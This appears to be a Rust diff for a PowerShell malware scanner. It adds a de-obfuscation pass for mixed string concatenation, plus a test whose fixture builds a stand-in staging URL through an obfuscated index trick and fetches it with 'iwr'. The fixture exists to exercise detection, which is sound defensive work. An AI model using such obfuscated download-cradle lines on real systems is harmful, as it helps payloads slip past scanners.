@@ -827,6 +827,67 @@ fn expand_parenthesized_string_concat(text: &str) -> String {
     result
 }
 
+fn expand_mixed_static_string_concat(text: &str) -> String {
+    let bytes = text.as_bytes();
+    let mut matches = Vec::new();
+    let mut pos = 0usize;
+    while pos < text.len() {
+        let Some((first_end, first_value)) = parse_ps_concat_literal_term(text, pos) else {
+            pos += 1;
+            continue;
+        };
+        if !is_string_concat_start(text, pos) {
+            pos = first_end;
+            continue;
+        }
+
+        let mut values = vec![first_value];
+        let mut end = first_end;
+        loop {
+            let plus_pos = skip_ascii_ws(bytes, end);
+            if bytes.get(plus_pos) != Some(&b'+') {
+                break;
+            }
+            let next_pos = skip_ascii_ws(bytes, plus_pos + 1);
+            let Some((next_end, next_value)) = parse_ps_concat_literal_term(text, next_pos) else {
+                break;
+            };
+            values.push(next_value);
+            end = next_end;
+        }
+
+        if values.len() >= 2 {
+            let joined = values.join("");
+            if joined.len() <= 8192 {
+                matches.push((pos, end, format!("'{}'", joined.replace('\'', "''"))));
+            }
+            pos = end;
+        } else {
+            pos = first_end;
+        }
+    }
+
+    let mut result = text.to_string();
+    for (start, end, replacement) in matches.into_iter().rev() {
+        result.replace_range(start..end, &replacement);
+    }
+    result
+}
+
+fn parse_ps_concat_literal_term(text: &str, pos: usize) -> Option<(usize, String)> {
+    let bytes = text.as_bytes();
+    match bytes.get(pos).copied()? {
+        b'\'' | b'"' => parse_ps_static_quoted_literal(text, pos),
+        b'(' => {
+            let literal_start = skip_ascii_ws(bytes, pos + 1);
+            let (literal_end, value) = parse_ps_static_quoted_literal(text, literal_start)?;
+            let close = skip_ascii_ws(bytes, literal_end);
+            (bytes.get(close) == Some(&b')')).then_some((close + 1, value))
+        }
+        _ => None,
+    }
+}
+
 #[allow(clippy::expect_used)]
 static DQ_STR_CONCAT_RE: Lazy<Regex> = Lazy::new(|| {
     Regex::new(r#"(?:\"(?:[^\"\\]|\\.)*\"\s*\+\s*)+\"(?:[^\"\\]|\\.)*\""#)
@@ -8006,9 +8067,11 @@ fn expand_obfuscation(text: &str) -> String {
             if signals.single_quote_concat {
                 out = expand_string_concat(&out);
                 out = expand_parenthesized_string_concat(&out);
+                out = expand_mixed_static_string_concat(&out);
             }
             if signals.double_quote_concat {
                 out = expand_double_string_concat(&out);
+                out = expand_mixed_static_string_concat(&out);
             }
             if signals.format {
                 out = expand_format_literals(&out);
@@ -10484,6 +10547,29 @@ iwr $url"#;
                     if src == "https://ps-concat-var-url.example/stage.ps1"
             )),
             "PS concat-extractor URL was not surfaced as a download: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn literal_index_extractor_mixed_concat_url_is_scanned_as_download() {
+        let script = br#"function Pick($value,$index) {
+  return $value[$index]
+}
+$url = (Pick "hx" 0) + "ttps://ps-index-mixed-concat.example/stage.ps1"
+iwr $url"#;
+        let mut env = Environment::new(&Config::default());
+        env.all_extracted_ps1.push(script.to_vec());
+
+        super::scan_ps1_payloads(&mut env);
+
+        assert!(
+            env.traits.iter().any(|t| matches!(
+                t,
+                Trait::Download { src, .. }
+                    if src == "https://ps-index-mixed-concat.example/stage.ps1"
+            )),
+            "PS index-extractor mixed concat URL was not surfaced as a download: {:?}",
             env.traits
         );
     }
